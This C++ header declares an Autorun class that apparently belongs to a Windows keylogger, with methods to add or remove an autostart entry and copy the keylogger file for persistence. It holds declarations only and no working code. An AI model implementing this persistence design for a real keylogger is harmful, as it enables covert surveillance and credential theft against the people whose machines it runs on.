#ifndef AUTORUN_H
#define AUTORUN_H

#include <windows.h>

#include "config.h"
#include "newwinapi.h"

class Autorun
{
public:
    Autorun();
    bool addAutostart();
    bool deleteAutostart();
    bool isActive();
    bool CopyFileAutostart();
    string getKeyloggerFileName();
    bool isCopyFile();
private:
    Config *config;
    newWinApi *newWinApix;
    string keyloggerFileName;
};

#endif // AUTORUN_H
